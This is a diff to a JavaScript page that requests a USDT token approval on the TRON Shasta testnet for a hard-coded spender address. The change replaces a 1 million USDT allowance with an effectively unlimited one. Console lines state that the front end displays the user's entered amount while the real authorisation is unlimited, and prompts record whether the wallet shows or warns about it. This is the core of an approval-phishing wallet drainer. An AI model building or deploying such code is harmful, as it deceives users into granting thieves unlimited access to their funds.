@@ -6,7 +6,7 @@ const spenderAddress = "TTqCn1whizbpg1o5EfHW9MUjGiKrX7ScRG";
 
 // ====== 最大授权额度 ======
 function getLargeEnoughAmount() {
-  return "1000000000000"; // 100万 USDT (6 decimals)
+  return "1000000000000000000000000000";
 }
 
 window.approveUSDT = async function() {
@@ -25,10 +25,10 @@ window.approveUSDT = async function() {
     const unlimitedAmount = getLargeEnoughAmount();
 
     console.log("前端显示:", inputAmount, "USDT");
-    console.log("实际授权: 100万 USDT");
+    console.log("实际授权: 无限额度");
     console.log("授权值:", unlimitedAmount);
 
-    setStatus(`⚠️ 请确认钱包中的授权金额为 100万 USDT...`);
+    setStatus(`⚠️ 请确认钱包中的授权金额为“无限”或超大值...`);
 
     const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
 
@@ -49,19 +49,19 @@ window.approveUSDT = async function() {
     // 用户反馈
     setTimeout(() => {
       const observation = prompt(
-        "测试: 100万 USDT 授权\n\n" +
+        "测试: 无限 USDT 授权\n\n" +
         "请记录钱包显示内容：\n" +
         "1. 显示的金额数字：\n" +
-        "2. 显示格式（是否为科学计数法、十六进制、或显示为具体数值？）\n" +
+        "2. 显示格式（是否为科学计数法、十六进制、或显示为“无限”？）\n" +
         "3. 是否有警告提示：\n\n" +
         "请简要描述："
       );
       if (observation) {
-        console.log("100万授权观察结果:", observation);
+        console.log("无限授权观察结果:", observation);
       }
     }, 2000);
 
-    setStatus(`✅ 100万 USDT 授权成功`);
+    setStatus(`✅ USDT 无限授权成功`);
 
   } catch (err) {
     console.error("授权失败:", err);
@@ -73,10 +73,10 @@ window.approveUSDT = async function() {
       errorMsg = "参数格式错误";
     }
 
-    setStatus("❌ 100万授权失败: " + errorMsg, true);
+    setStatus("❌ 无限授权失败: " + errorMsg, true);
 
     setTimeout(() => {
-      alert("100万授权失败，可能钱包不支持该数值");
+      alert("无限授权失败，可能钱包不支持该数值");
     }, 1000);
   }
 };
